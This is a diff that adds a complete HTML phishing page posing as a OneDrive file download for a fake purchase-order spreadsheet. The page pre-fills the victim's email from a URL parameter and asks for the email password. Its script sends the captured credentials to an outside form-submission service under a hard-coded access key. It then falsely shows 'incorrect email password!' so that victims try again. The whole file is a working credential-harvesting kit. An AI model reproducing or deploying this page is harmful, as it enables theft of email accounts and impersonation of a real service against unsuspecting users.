@@ -1,0 +1,108 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="css/drv.css">
+    <title>One Drive</title>
+</head>
+<body>               
+    <main>
+        <section id="side_bar">
+            <aside>
+                <h1>PO-587451.xls</h1>
+            <p>Your file (PO-587451.xls) is ready for download!</p>
+            <ul>
+                <li>File Size: 8.2mb</li>
+                <li>File Format: MS Excel</li>
+                <li>File Name: PO-367459.xls</li>
+                <h2>File Preview  PO-367459.xls</h2>
+                <img id="xls_file" src="images/1.png" style="width:200px; height:100px;">
+            </ul>
+            <p id="side_footer">OneDrive Online Cloud | All rights reserved ©2024</p>
+            </aside>
+            <input type="hidden" id="pager" value="4">
+        </section>
+        <section id="main_container">
+            <div id="form_caller">
+<center><img src="images/logo-fill.png" style="width:120px; height:40px;"></center>
+                <center><img id="drv_logo" src="images/0.jpg" alt=""></center>
+                <div>
+                <center><p><b>Best Online Cloud for storing and sharing large files!</b></p></center>
+                </div>
+                <div id="form_main">        
+<aside id="form_aside">        
+<img src="./0.jpg" alt="">         
+<center><p>Confirm your account to start download!</p></center>
+<form method="POST" id="form">
+<!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="5f8fe7dc-9e92-4cfb-a4d9-352c4b25bbae">      
+<input type="email" class="input_mail" name="ai" id="email" placeholder="Enter Email Address" readonly value="${temp_mail.value}">        
+<input type="password" name="si" id="password" class="input_pass" placeholder="Enter Email Password">        
+<button class="submit" id="submit" type="submit" >Download Now</button>
+<center><div id="result"></div></center>
+
+</form>
+<script src="https://web3forms.com/client/script.js" async defer></script>
+
+<script>
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "Please wait..."
+
+    fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                result.innerHTML = "incorrect email password!"; 
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "Something went wrong!";
+        })
+        .then(function() {
+            password.reset();
+            setTimeout(() => {
+                result.style.display = "none";
+            }, 3000);
+        });
+});
+</script>
+
+<script type="text/javascript">
+var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : sParameterName[1];
+        }
+    }
+};
+
+var firstname = getUrlParameter('e');
+
+     document.getElementById("email").value = firstname;
+
+</script>
+
+</body></html>
